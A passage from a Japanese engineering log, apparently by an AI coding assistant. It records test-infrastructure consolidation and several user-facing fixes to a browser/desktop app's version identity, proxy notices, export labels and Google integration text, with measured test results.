`measure-before-claim`)。弁別標本 10 種への出力を繋いだ指紋で分けると **7 契約**。参照実装 (字句解析) と突き合わせた実測 (2026-09-25 · `src` の 1,444 本):

| 向き | 何が起きるか | 実測 |
| --- | --- | ---: |
| **落とし過ぎ** | 文字列の中の URL で切れ、**その行の後ろが消える** | **15,361 行** (3 写し) |
| 同 | 文字列の中の素の 2 連スラッシュで切れる | 1,375 行 (3 写し) |
| **残し過ぎ** | **行末の注記が code として残る** (法則 `mention-vs-declaration`) | **2,420 行 / 480 本** (6 写し) |
| 行番号 | ブロック注記の行が詰まり、掴んだ位置が実物とずれる | 6 写し |

★ **直し**: 共有の字句解析器 (`shared/__tests__/stripNonCode.ts`) に `stripComments` を足す —— 注記だけを落とし、**文字列・テンプレート・正規表現の中身は残す** (それが `codeOnly` の仕事で、`stripNonCode` が代われない当の理由。あちらは文字列の中身を落とすので、探している綴りが消える)。走査器は 1 つで、`keepLiterals` で分ける。**`stripNonCode` の振る舞いは両モード・`src` と `scripts` の 1,446 本すべてで 1 字も変わっていない** (実測)。★ **正直に書く: 今日どの census の答えも変わらなかった** —— 13 本を寄せて走らせると**落ちたのは 2 件だけ**で、どちらも「裸の続き行を注記として食わせる**人工的な標本**」だった (実物の走査はファイル全体を渡すので、続き行は必ずブロック注記の内側に在る —— その形は 1 度も来ない)。13 本のうち 11 本は**両方向の台帳**を持つので、母集団が動けばそこが鳴る。つまりこれは**罠の除去**であって生きた欠陥の修復ではない (パス 359 / 398 / 439 と同じ位置づけ)。★ **ただし標本の側は生きた欠陥だった** —— その 2 件は「注記の中では数えない」を主張しながら、**実物では起こり得ない形**で確かめていた。走査に掛ける物と同じ形の標本と、**行末の注記**の標本 (6 写しでは素通りしていた形) へ直した。CLAUDE.md の規約「不在の主張には標本を添える」の、**標本の形**についての現れである。★ **母集団は名前ではなく算法で数える** —— `codeOnly` は 1 つの名前にすぎず、同じ算法は `code()` / `read()` / `withoutComments()` / `isCommentLine()` ほかの名前でも書かれており、**算法で数えると 67 本**あった。13 本を寄せたので残り 66 本を `shared/__tests__/commentStripperCensus.test.ts` の `REMAINING` が**両方向**で持つ。★ **理由の欄は作らない** (パス 368 の tick 台帳と同じ判断) —— どの行も同じ「まだ寄せていない」で、理由が埋まると「保留を検査に書く」形になる (法則 `no-weakness-as-spec`)。**減らすことだけが正しい向き**なので、台帳と母集団が両方向で一致することだけを機械が持つ。★ **免除は 2 件で、どちらも理由を測って書いた** —— ① この検査自身 (**針の綴りを定数で持つだけ**で実装は持たない。`stripNonCodeParity` が「この道具を自分自身に当てるのが正しい形」と書いた当のことで、**書いたその場で母集団に入った**) ② **出荷コードの** `securityRange.normalizeForDetection` —— ブロック注記を空白へ潰すのは*ソースの注記*を落とすためではなく、**SQL インジェクションの回避手法 (語と語の間に空のブロック注記を挟む) を打ち消す**ためで、`securityRange.test.ts` が標本つきで留めている。**出荷コードに注記除去器が在ると見えたので先に読んだら、別物だった。**★ **対照 8 方向すべて鳴り、それぞれ狙った層に当たる** (A 文字列の中身を落とす ❌11 / B 行末の注記を残す ❌4 / C 行番号を詰める ❌3 / D 台帳から 1 行消す ❌1 / E 14 個目を植える ❌1 / **F 寄せた 1 本を自前の写しへ戻す ❌2** (母集団の census と「寄せた 13 本」の**両方**に当たることを失敗の名前で確かめた) / H 免除の理由を省略形へ ❌1 / I 針を殺す ❌3・復帰後 **69 / 69**)。★ **`.cjs` の 5 本はまだ寄せていない** —— `.ts` を require できないので、寄せるなら `scripts/lib/strip-non-code.cjs` に `stripComments` を足して**パリティ検査で縛る** (パス 418 / 452 と同じ形)。`typecheck` 緑・`npm test` **899 / 19,070**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15871 → **15878** へ —— **今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いていないので)・**2026-09-25 パス 460 後の計測: 11,971,801 B / 3,384,320 B (両方 +59 B** —— 身元の接尾辞 1 つ・それを見る判定 1 つ・版を 1 度だけ名乗る定数 1 つ・サイドバーの札 1 語。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**「どの実行形態か」を「版」で決めていたので、版を 1 つ上げる編集がブラウザ版の唯一の入口 (ロック画面) を消していた。** **見つけ方**: パス 459 が残した問い (`docs/REMAINING_WORK.md` の 1 件目 —— 「`web-shim` が版を 2 か所に直書き」) をそのまま測りに行った。**題は「版の直書き」だが、測ったら本体は身元のほうだった。** 実測 (2026-09-25 · 直す前 · `web-shim.ts` の**作る側だけ**を 1 つ上の版へ):

| 測った物 | 実測 |
| --- | --- |
| `npm test` | **896 ファイル / 19,048 件すべて緑** |
| `isBrowserBuild()` | **`false`** (ブラウザ版がデスクトップ版を名乗る) |
| 実物の App のロック画面 | **出ない** |
| `ProxyRequiredNote` の DOM | **0 字** (パス 459 の断りが消える) |

★ **いちばん重いのはロック画面で、そこはブラウザ版が保管庫を解錠する唯一の入口である** —— 素通りすると `App` の `setVaultUnlocked(true)` は通るが**保管庫の鍵は作られない**。以後どの資格情報も「Vault がロックされています」で断られ、**解錠の操作子はどこにも無い** (パス 455 がデスクトップ版について実測した当の状態)。つまり**版を 1 つ上げる編集が、ブラウザ版の利用者を自分の金庫から締め出す**。★ **綴りは 2 か所ではなく 136 か所だった** —— 出荷コード 2 つ (作る側 `web-shim.ts` / 比べる側 `runtimeMode.ts`) に加え、**検査の代役が 134 か所**で同じ版を手書きしている。完全一致のままだと、版を上げた日にその 134 本が**黙って別の実行形態を試し始める** (パス 457 の「標本が母集団を名乗らない」の別の形)。★ **2 つ目 —— 版そのものも 2 か所に在った**: `getVersion` と `checkUpdate` の `current` で、`package.json` を上げた日に後者だけが古い版と比べる。実測: 古い版と新しいリリースを `evaluateUpdate` に渡すと `update-available` なので、**最新の HTML を配信されている利用者に「更新があります」と言い続ける**。★ **3 つ目 —— サイドバーの札**: `{version ? … : 'v0.1.0'}` と直書きで、実測 (reject する橋で実物の App を描く) すると**永久に `v0.1.0` と言う**。版を上げた日には動いているどの版に対しても偽になる。**直し**: ① 身元は `shared/buildDestinations.ts` の`WEB_BUILD_SUFFIX` / `isWebBuildVersion` **1 つ**が持ち、作る側と比べる側の両方が読む —— **見るのは接尾辞だけ**なので版の数は自由に動ける ② 版はブラウザ版の中で **1 回しか名乗らない** (`WEB_BUILD_VERSION`)。`getVersion` が接尾辞を足し、`checkUpdate` は数のほうを読む ③ **接尾辞は `checkUpdate` には渡さない** —— 渡すとパス 402 で入れた semver の順序 (プレリリースは正式版より前) が効いて**同じ版に対して `update-available`** になる (実測・検査に床として留めた) ④ サイドバーは数の代わりに**理由**を出す (「版不明」—— パス 410 の「価格不明」「在庫不明」と同じ形) ⑤ **床**: `package.json` の版が接尾辞で終わらないこと (終わるとデスクトップ版が自分をブラウザ版と名乗り、判別子ごと壊れる)。★ **直した後の実測 (版を 1 つ上げる)**: `isBrowserBuild()` は **`true` のまま**・ロック画面は**出る**・`checkUpdate().current` は**上げた版に追随する**。★ **`package.json` からの注入 (vite の `define`) は採らなかった** —— `vitest.config.ts` は別の config なので両方に置く必要が在り、898 ファイルの検査が読み込み時に未定義の global に当たる形を作る。**測って、採らない理由を `docs/REMAINING_WORK.md` に残した。**★ **機械は 2 層** —— `renderer/__tests__/buildSentinelStability.test.ts` (**9 件**) が**振る舞い**で (版を 5 通りに変えても実行形態が動かないこと・実物の shim の `getVersion` が繋がっていること・`checkUpdate` の `current` が `getVersion` − 接尾辞であること・橋が投げたら fail closed・上の 2 つの床)、`renderer/__tests__/versionNamingCensus.test.ts` (**6 件**) が**綴りの母集団**を両方向で持つ。★ **census は生の原文を走る (理由を実物に書いた)** —— `stripNonCode` は**文字列リテラルの中身を落とす**ので(パス 453 / 459 の非対称)、探している物そのものが消えて**どの入力でも通る検査**になる。生で走る代わりに**注記の中で版を引用しても鳴る**ので、**自分の docblock を 6 か所言い換えた** (パス 347 / 370 と同じ判断 —— 例外を作るとそこが穴になる)。★ **対照 9 方向すべて鳴り、それぞれ狙った層に当たる** (A 完全一致へ戻す ❌2 (**欠陥がそのまま再現**) / B 判定を常に true ❌2 / C 常に false ❌3 / **D `checkUpdate` を同じ値で直書き ❌1** (census だけ —— 値が同じなので振る舞いには映らない) / **E 古い版で直書き ❌2** (census + 振る舞い) / F `getVersion` が接尾辞を付けない ❌2 / G サイドバーを版の数へ戻す ❌1 / H 台帳から 1 行消す ❌1 / I 3 つ目のファイルが接尾辞を手書き ❌1・復帰後 **15 / 15**)。★ **D と E の差が層の分担を示す** —— 「同じ値で 2 度名乗る」は綴りの層だけが見え、「食い違う値で 2 度名乗る」は両方が見える。★ **ゲートが 3 つ捕まえた —— どれも設計どおり**: ① **`fixedTickAssertionCensus` (パス 368)** が私の新しい検査を名指しした (**固定 20 周**のあと文を主張していた)。共有の `waitForText` へ寄せ、錠は**シェルが出ること** (`build: ALL-ACCESS` —— 判定が終わったときにだけ現れる) にした。主張したい物で待つと待ちが主張を飲み込む (パス 379)。**このファイルは固定回数の待ちを 1 つも持たなくなった**ので`audit:tick-sensitivity` の母集団からも外れる ② `verify:arch` のユニットテスト数を 15856 → **15871** へ (**今回も予想せず門に訊いた**) ③ `lint:shared-judgement` —— `buildDestinations` の renderer 側の読み手が10 → 12。**判定は今も真** (実測: `src/main` / `src/preload` からこのモジュールと新しい 2 つの export への参照は**0 件**) なので、理由に「このモジュールは 2 つ目の役目 (身元) を持った」を書き足して再生成した。★ **自戒: 検査は 9 件とも緑なのに `typecheck` だけが 1 件捕まえた** —— `await import('fake-indexeddb/auto')` に型宣言が無い (先頭の静的 import なら通る)。vitest は型を剥がす。**パス 373 以来同じ罠で 13 度目**である。★ **測って何も無かった軸も記録する**: ① **`vite.config.ts` / `vitest.config.ts` に `define` は 1 つも無い** —— だからブラウザ版は `package.json` の版を読めず、手書きするしかなかった (欠陥の由来) ② **`codeOnly` (注記だけを落とす道具) の写しが 10 個在り、5 つは export されているが全部 `.test.ts` の中**なので import すると describe が再登録される (パス 459 が `webShimScan.ts` を切り出した当の罠)。**11 個目を作らずに済ませた**ので今日は直していない —— `docs/REMAINING_WORK.md` に測って残した ③ **`isBrowserBuild` / `useBuildKind` の出荷コードの読み手は 10 ファイル**で、身元が反転すると パス 454〜459 の 6 つの判断がまとめて逆を向く。`typecheck` 緑・`npm test` **898 / 19,063**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 245 ms / heap 10.3 MB・FULL DCL 768 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **56 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 459 後の計測: 11,971,742 B / 3,384,261 B (両方 +1,074 B** —— 前提を述べる 1 文 (日本語)・共有の部品 1 つ・7 画面の配線。**増分の大半はその 1 文**で、docblock は最小化で落ちる。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**ブラウザ版の書き込み 13 / 15 はプロキシが無いと 1 通も送れないのに、そう述べる画面は 3 枚だけだった。** **見つけ方**: パス 458 が残した問い (`docs/REMAINING_WORK.md` の 3 件目 —— 「ブラウザ版が外へ送る 15 の道のうち、測ったのは Google 3 と ms365 2 だけ」) を測りに行った。実測 (2026-09-25 · 直す前 · 実物の shim を読み込み、保管庫に本物のトークンを入れ、プロキシだけ未登録にして 15 の action を実際に叩く):

| 道 | 件数 | 実測 |
| --- | ---: | --- |
| プロキシが要る | **13** | 「この連携はブラウザの制約 (CORS) でプロキシが必要です…」 |
| 直接つながる | **1** | **`github/create-issue` は api.github.com へ実際に届いた** (CORS 許可・401 が返った) |
| 別の理由で先に断る | **1** | `security/scan-url` は VirusTotal の鍵が未設定 |

★ **断りは正しく、働く道 (設定ページ) も名指しする。偽だったのは時機である** —— そこへ辿り着くまでに利用者は**本物の API トークンを保管庫へ貼り付け**、フォームを埋めている。パス 454 / 455 / 456 / 457 で4 度下したのと同じ判断で、**断りは押す前に言う**。★ **アプリ自身が正しい文を別の場所で持っていた** —— `Microsoft365Page` と (パス 457 が直した) `googleLiveScopeNote` は「プロキシ設定が要ります（設定ページ）」と**前提として**述べる。実測すると、プロキシを要する 11 サービスのうちその前提を名乗るのは **ms365 と Google の 3 画面だけ**で、notion / slack / atlassian / canva / wordpress / cloudflare / security の **7 画面は 1 文も述べていなかった** (パス 398 / 408 / 451 / 457 / 458 と同じ非対称 —— **直す向きはアプリ自身が持っている**)。★ **`SecurityPage` は「経由する」と述べるが「要る」とは述べていなかった** —— 「設定したプロキシ (Cloudflare Worker) を経由するため、その運用者からも見えます」は*経路の開示*であって前提ではない。未登録の利用者はそこから「登録が要る」を読み取れない。★ **`CloudflarePage` の「プロキシ」は別物だった** —— 同じ画面に「Cloudflare プロキシを通す（オレンジ雲）」が在り、それは DNS レコードの旗である。**綴りだけを数える検査はこれで満たされてしまう**ので、背骨は DOM の位置で見る。**直し**: ① 文は `shared/buildDestinations.ts` の `proxyRequiredNote(kind, what)` (`.tsx` は変異検査の母集団の外) ② **デスクトップ版では何も言わない** (main は各サービスへ直接つなぐので、そこで「Worker を建てろ」と言うのは**偽の前提**を渡すことになる) ③ **分からないあいだ (`null`) も言わない** ④ **フォームは隠さない** (既に登録している人から送る口を奪う · 法則 `escape-hatch-stays-open`) ⑤ 断りの綴り (「プロキシが必要です」) を**引用する** —— 押した後に出る文と同じ語を先に見せれば、読んだ人は 2 つを結べる ⑥ 働く道は**設定画面の節の見出し**で名指しする (「BYO プロキシ」—— 実在を検査が `SettingsPage` と突き合わせる)。★ **デスクトップ版の答えは 1 文字も変わらない** (実測: 3 つの実行形態を描いて、断りが出るのはブラウザ版だけ)。★ **機械は 2 層** —— `renderer/__tests__/proxyRequiredNoticeCensus.test.ts` (**12 件**) が母集団を**実装から導き** (`proxyRoutedActions` が `web-shim.ts` の分岐を数える・実測 14 action) 台帳と**両方向**に突き合わせ、行ごとに断りの出どころ (`shared` / `own`) を理由つきで名乗らせる。`pages/__tests__/proxyRequiredOnScreen.test.ts` (**4 件**) が**実物の `CloudflarePage` を 3 つの実行形態で描き**、2 つのフォームのどちらにも断りが在ること・**DOM の順序で最初の入力欄より前に在ること**・押す口が消えないことを見る。★ **対照 12 方向すべて鳴り、それぞれ狙った層に当たる** (A 実行形態を見ない ❌3 / B 常に null ❌5 / C SlackPage から外す ❌2 / **D 2 つのうち 1 つを外す ❌2** / E 台帳から 1 行消す ❌1 / F 母集団に無い行 ❌1 / G ms365 が前提を名乗らない ❌1 / **H 断りが入力欄を子に取る ❌1** (逃げ口) / **I 断りを入力欄より後ろへ ❌1** (時機) / J 走査を殺す ❌3 / K 画面に星印を戻す ❌1 / L 部品が実行形態を問わない ❌2・復帰後 **73 / 73**)。★★ **対照 D が 1 度目に 1 件しか鳴らず、それは私の census の欠陥だった** —— `CloudflarePage` と `SecurityPage` は台帳に 2 行ずつ持つのに、綴りの層は「1 つでも在れば良い」形だった。**片方を外しても黙る**ので**画面ごとに行の数だけ数える**形へ直すと D は ❌2 になる (振る舞い + 綴り)。★ **自戒 2 つ**: ① **走査の道具を検査ファイルから import して 24 件が二重に走った** —— `proxyRoutedActions` は `webShimTimeouts.test.ts` に在り、import すると中の `describe` がもう一度走る (`shared/__tests__/stripNonCode.ts` が 2026-09-14 に同じ理由で切り出された当のこと)。`renderer/__tests__/webShimScan.ts` へ**1 字も変えずに**移した ② **対照 H の 1 度目は JSX を壊し、振る舞いの 4 件が 1 度も走らなかった** (`Tests 69` = 73 − 4)。**「検査が 0 件」は緑ではない** (パス 412 / 444 と同じ) —— 構文として正しい形 (入力欄を子に取る) で当て直して ❌1。★ **ゲートが 3 つ捕まえた** —— ① **`recordStoreIsolation`** が私の新しい検査を名指しした (`_resetRecordStoreForTests()` は singleton を捨てるだけで IndexedDB は残る。共有の `resetRecordStore()` へ寄せた。**隣の検査から harness を写したので、その検査の免除ごと写していた**) ② `verify:arch` のユニットテスト数を 15836 → **15856** へ (**今回も予想せず門に訊いた**) ③ `lint:shared-judgement` —— `buildDestinations` の renderer 側の読み手が 9 → 10。**判定は今も真**なので理由に新しい部品と検査を足して再生成した。★ **ついでに、画面に星印が出ていた 1 行を直した** —— `Microsoft365Page.tsx:209` は JSX の素のテキストに Markdown の強調記法を書いており、React は解釈しないので**画面に `**取得**` と出ていた**。**族を先に数えた** (実測: 出荷される `.tsx` の JSX テキストで `**` を持つ行は**この 1 行だけ**) —— 走査は同じ census が持ち、`stripNonCode` を通す (注記と文字列の中の `**` は画面に出ないし、このリポジトリの docblock は強調記法を多用するので、通さないと**自分の説明文で落ちる**)。★★ **そして、このパスの出発点 (task #136) は「測って何も無かった」で終わった** —— パス 458 の自戒 (「不在の主張の標本は、走査に掛ける物と同じ加工を通さないと意味が無い」) の母集団を測ると、**本物の `stripNonCode` を読む 18 ファイルで、stripped な本文へ日本語の針を当てている所は 0 件**だった (見つかった 8 行は「注記を食わせる標本」3 件・「日本語は主張の説明文で針は ASCII」4 件・JSX テキストを探す 1 件)。★ **ただし測定が 1 つ新しい事実を出した** —— **`stripNonCode` は文字列リテラルの中身を落とすが、JSX の素のテキストは落とさない**。つまり同じ日本語でも**どこに住んでいるかで主張の生死が変わり**、主張の字面は**どちらも同じ**なので書いた人には見分けが付かない (パス 458 で私が落ちた当の罠で、`stripNonCode` の docblock はこの非対称に 1 文も触れていなかった)。`shared/__tests__/stripNonCodeParity.test.ts` に**振る舞いで**留め (27 → **33 件**)、CLAUDE.md の規約「不在の主張には標本を添える」に 1 行足した。`typecheck` 緑・`npm test` **896 / 19,048**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 263 ms / heap 10.3 MB・FULL DCL 718 ms / heap 37.1 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **55 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 458 後の計測: 11,970,668 B / 3,383,187 B (両方 +601 B** —— 実行形態ごとの札 1 つ・収まった先を名乗る 1 文 (日本語)・5 画面の配線・断りの文面の差し替え。**増分の大半はその 1 文**で、docblock は最小化で落ちる。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**騒がしく断る 2 つの隣で、1 つだけが静かに名前と違う物をクリップボードへ置いていた。** **見つけ方**: パス 457 が残した問い (`docs/REMAINING_WORK.md` の 1 件目) をそのまま測りに行った。実測 (2026-09-25 · 直す前 · jsdom で実物の `ExportActions` を描いて押す):

| 操作子 | ブラウザ版の実測 |
| --- | --- |
| ファイルを開く | **騒がしく断る** (`data-os-op-error` + alert) |
| 保存先フォルダを開く | **騒がしく断る** |
| **保存場所をコピー** | **静かに `team-radar-….svg` を置き「✓ コピー済み」と言う** |

★ **ブラウザ版の書き出し action が返す `path` はファイル名だけ** (`web-shim.ts` の 4 か所が `path: filename`)。デスクトップ版は `path: filePath` で**絶対パス**なので、同じ札が実行形態で別の物を指していた —— 押した人は「場所」を手に入れたつもりでファイル管理ソフトの場所欄へ貼り、当たらない。★ **アプリ自身が正しい語を別の場所で持っていた** —— `HomePage.tsx:204` は同じ値を「ファイル名: …」と名乗る (パス 398 / 408 / 451 / 457 と同じ非対称で、**直す向きはアプリ自身が持っている**)。★★ **2 つ目 —— この実行形態で実際に開ける場所を、書き出しの流れのどこも名指ししていなかった。** ブラウザ版の書き出しは 3 か所 (端末のダウンロード / ライブラリ / PC の指定フォルダ) へ置こうとし、結末を `downloaded` / `libraryCopy` / `folderCopy` として**返している**のに、それを読んで「どこに収まったか」を言う面は **0 件**だった (読み手 5 画面はどれも `exportWarning` = **失敗した先**しか読まない)。つまり**働く道が文になるのは失敗したときだけ**で、成功した人には 1 度も示されない (法則 `escape-hatch-stays-open`)。★★ **3 つ目 —— 断りが「場所」を無条件に主張していた**: `notSupportedAlert` は「ファイルはお使いのブラウザのダウンロードフォルダに保存されています。」と言うが、この関数は書き出しの結末を**何も知らない**ので、`downloaded === false` の状態 (アプリ自身が `DOWNLOAD_FAILED_TEXT` として持っている状態) では**偽**になり、しかも**その人を、そのファイルが無いフォルダへ探しに行かせる** (パス 388 の家系)。**直し**: ① 札は `shared/buildDestinations.ts` の `exportCopyLabel(kind)` (`.tsx` は変異検査の母集団の外) —— ブラウザ版は「ファイル名をコピー」 ② **操作子は消さない** (ファイル名は「ライブラリ」でも端末のダウンロードでもその行を探す鍵である · 法則 `escape-hatch-stays-open`) ③ **分からないあいだ (`null`) は今までの札のまま** (間違って名乗るより 1 フレーム遅れて直す) ④ 収まった先は `data/exportOutcome.ts` の `exportSavedNote(data)` が言う —— **実行形態は問わず、欄の有無で決まる** (デスクトップ版の action は `libraryCopy` を返さないので `undefined`。`exportWarning` が既に持つ「欄が無いときは何も言わない」規則をそのまま使うので、`useBuildKind` の1 フレームの遅れも入らない) ⑤ **`⚠` と食い違わない** —— ライブラリに残せていないときは黙る (`LIBRARY_FAILED_TEXT` が既に述べる · パス 392 / 447 の形を作らない) ⑥ 断りは場所ではなく**働く道**を名乗り、綴りは `LIBRARY_HATCH_TEXT` **1 つ**を両方が読む。★ **デスクトップ版の答えは 1 文字も変わらない** (実測: 札も、置く物 (絶対パス) も、`saved` が `undefined` なのも)。★ **機械は 2 層** —— `renderer/components/__tests__/exportActionsBuildGate.test.ts` (**8 件**) が実物のカードを3 つの実行形態 (browser / desktop / **まだ分からない**) で描いて実際に押し、クリップボードに載る物まで読む。`renderer/data/__tests__/exportSavedNote.test.ts` (**7 件**) が判定を両方向に持ち、**母集団** (`exportWarning` を読む画面は `exportSavedNote` も読む) を走査で導く。断りの文面は `renderer/__tests__/webShimExportSinks.test.ts` に **2 件**足して**実物の shim を読み込んで `openPath` / `revealInFolder` を呼び**、返る文を読む。★ **対照 13 方向すべて鳴り、それぞれ狙った層に当たる** (A 札を常にデスクトップ版へ ❌2 (**欠陥の再現**) / B 画面が札を直書き ❌3 / C 判定を常に undefined ❌3 / D 残せなかったときも名指しする ❌1 (**⚠ と食い違う**) / E 欄の有無を見ない ❌3 / F 画面が 1 文を描かない ❌1 / G 1 画面が渡さない ❌1 (両方向) / **H 断りを場所の断定へ戻す ❌3** / I ブラウザ版でコピーの操作子を隠す ❌4 (**逃げ口**) / J 印を外す ❌8 / K 分からないときにブラウザ版へ倒す ❌2 / **L 断りの文を写しで持つ ❌1** (綴りの側) / M 台帳から新しい行を消す ❌1)・復帰後 **35 / 35** + **16 / 16** + **13 / 13**。★★ **自戒: 対照 H が 1 度目に鳴らず、原因は私の検査が空だったことである。** `stripNonCode` は**文字列リテラルの中身を落とす** (パス 453 で自分で書いた罠) ので、日本語の文を code 側で `not.toContain` する主張は**どの入力でも通る**。標本も添えていたが、その標本を**生の文字列**に当てていたので「針は生きている」しか示せていなかった —— **不在の主張の標本は、走査に掛ける物と同じ加工を通さないと意味が無い。** 文面は振る舞い (実物の shim を呼ぶ) へ移し、綴りの側は**識別子** (`stripNonCode` が落とさない) だけを見る形にした。★ **対照 L も報せだった** —— 同じ文を局所の定数で持っても**振る舞いは 1 つも変わらない**ので鳴らない。import であることを要求して初めて鳴る (法則 `center-then-count-callers`)。★ **ゲートが 2 つ捕まえた —— どちらも設計どおり**: ① **`namedEscapeHatchReachable` (パス 425)** が新しい `LIBRARY_HATCH_TEXT` を「台帳に書け」と鳴らした (理由つきで `other-screen` として登録。**標本を持たない**のは、この文が保管した*記録*の不備からではなく書き出しの結末から生まれるため) ② `verify:arch` のユニットテスト数を 15819 → **15836** へ (**今回も予想せず門に訊いた**) ③ `lint:shared-judgement` —— `buildDestinations` の renderer 側の読み手が 8 → 9。**判定は今も真**なので理由に新しい門を足して再生成した。★ **`typecheck` だけが 1 件捕まえた** (`waitForElement<HTMLElement>` へ渡す `querySelector` が `Element`) —— vitest は型を剥がす。**パス 373 以来同じ罠で 12 度目**である。★ **測って何も無かった軸も記録する**: ① **`data-export-warning` の 5 画面はどれも `exportWarning` を通る** (手書きの写しは 0 件) ② **`library.list()` は serviceId で絞らず全件を返す**ので、書き出した物はどのサービスの物でも「ライブラリ」の画面に出る (名指しが空振りしない) ③ **`downloadBlob` が `false` を返すのは例外のときだけ** (`createObjectURL` / `Blob` / `click` が投げる) —— 稀だが**アプリ自身がその状態を文として持っている**ので、断りがそれと矛盾してはいけない。`typecheck` 緑・`npm test` **894 / 19,026**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 253 ms / heap 10.3 MB・FULL DCL 739 ms / heap 37.1 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **54 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 457 後の計測: 11,970,067 B / 3,382,586 B (両方 +1,593 B** —— Google の 3 画面が共有するカードに、実行形態を問う口 1 つ・**向きごとに分けた取得/送信の文**・方法 A の断り 1 文 (日本語) ・3 行の表 (`GOOGLE_BROWSER_SEND`)。**増分の大半はその 2 文**で、docblock は最小化で落ちる。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**3 画面が「送信はデスクトップ版の機能」と述べ、ブラウザ版は本当に送っていた。** **見つけ方**: パス 454 / 455 / 456 の問い (「この実行形態で本当に働くか」) の**鏡**を当てた —— あちらは「デスクトップ版で働かない面」、こちらは**「ブラウザ版で働くのに、働かないと書いてある面」**。3 軸を先に測り、**2 つは何も無かった**: ① **`vault.listConfigured()` の出荷コードの読み手は 1 件だけ** (`SettingsPage:234` の `CredentialRow`)。`requireKey()` を通らないので施錠中でも投げずに `[]` を返すが、**ブラウザ版で設定画面が描かれるのは保管庫が解錠済みのときだけ** (`App.tsx` の `if (browserMode && !vaultUnlocked)` が先に `LockScreen` を出す) ので、`[]` を事実として扱う面は無い ② **パス 456 がデスクトップ版に残したプロキシの保存値は、節の「削除」で消せる** (逃げ口は開いている)。本物は 3 つ目だった。`GoogleConnectCard` (Drive / Calendar / Gmail の **3 画面**が共有) の末尾は 2026-08 から「ライブ接続（実データ取得・送信）はデスクトップ版の機能で、ブラウザ版は同梱スナップショットを表示します。」と述べていた。実測 (2026-09-25 · 直す前):

| 向き | ブラウザ版の実測 |
| --- | --- |
| 取得 | **真** —— `LIVE_READERS` は `cursor` **1 件だけ**なので drive / calendar / gmail は `not_implemented` へ落ちる |
| **送信** | **偽** —— `web-shim.ts` の invoke が 3 つの action を `runProxyBearer` → `saasWriteWeb` へ振り分ける |

実物の writer に偽の transport を渡して要求を読むと (保管庫のトークンを Bearer に載せて) `POST https://www.googleapis.com/drive/v3/files` / `…/calendar/v3/calendars/primary/events` / `https://gmail.googleapis.com/gmail/v1/users/me/drafts` の **3 回**。★ **向きが利用者の損である** —— この 1 文は「この実行形態では何も外へ出ない」と読める唯一の文で、それを読んだ人が同じ 3 画面に在るフォームを押すと、**本人の Google Drive に実際のフォルダが、Gmail に実際の下書きが作られる**。法則 `egress-notice-before-send` は「外へ送る画面は何を送るかを言う」と述べるが、ここは**逆を言っていた**。★ **同じアプリが別の場所で正しく書いていた** —— `Microsoft365Page.tsx:209` は「実データの取得はデスクトップ版の機能です（…）。メール送信と予定作成はブラウザ版でも動きます —— プロキシ設定が要ります（設定ページ）。」と**向きを分けて**述べる。ms365 の書き込みは**同じ形** (`runProxyBearer` → `saasWriteWeb`)、同じ 2 action。**直す向きはアプリ自身が持っており、Google のカードだけがその前提を持っていなかった** (パス 398 / 408 と同じ非対称)。★★ **2 つ目 —— 方法 A（推奨・恒久）はブラウザ版で走らず、断りは実作業の後に来た**。実測 (直す前・jsdom で実物のカードを描き、打って押す): 方法 A の手順 3 段も欄もボタンも**出て押せ**、押すと「ブラウザ版では OAuth フローを実行しません」が出て、**クライアント ID は実際に localStorage へ保存される**。そこへ辿り着くまでに利用者は Google Cloud Console で OAuth クライアントを作り 3 つの API を有効化している (手順 1-2 がそう指示する) —— **数分の実作業を終えてから、その道がこの実行形態に無いと知る**。しかも**順位が逆**で、ブラウザ版では**推奨が不可能でお試しだけが働く**。「恒久」はブラウザ版に存在しない: 設定ページの貼り付け式 PKCE も `accessToken` だけを持つ (パス 454 の実測) ので、ブラウザ版で取れる Google の資格情報は**どちらも約 1 時間**である。**直し**: ① 文は `shared/buildDestinations.ts` が持つ (`.tsx` は変異検査の母集団の外) —— `googleLiveScopeNote(kind, serviceId)` が**向きごとに分けて**言い、`GOOGLE_BROWSER_SEND` (3 行) から**何が作られるか**を名乗る (「書き込み」と曖昧に言うと、読んだ人は*何が*作られるのか分からない) ② `googleSignInUnsupportedNote(kind)` が**押す前に**断り、**働く道を 2 つ名指しする** (同じカードの方法 B と、設定ページの Google OAuth の節)。ブラウザ版では方法 A の手順・欄・ボタンを**描かない** ③ `signIn()` にも床 —— **保存より前に断る** (走らない道のためにクライアント ID を端末へ残さない) ④ **分からないあいだ (`null`) は断らない** (既定を `'browser'` に倒すと、橋の `getVersion` が一瞬遅れただけでデスクトップ版の唯一の恒久的な Google 認証の道が消える) ⑤ **方法 B とトークンの案内はブラウザ版でも残す** (法則 `escape-hatch-stays-open`)。★ **デスクトップ版の答えは 1 文字も変わらない** (実測: 方法 A が出て、押せば `authorize` へ届き、クライアント ID も保存される)。★ **機械は 2 層** —— `renderer/components/__tests__/googleConnectCardBuildGate.test.ts` (**8 件**) が実物のカードを 3 つの実行形態 (browser / desktop / **まだ分からない**) で描いて打って押し、★ の 1 件は**実物の 3 つの writer が googleapis 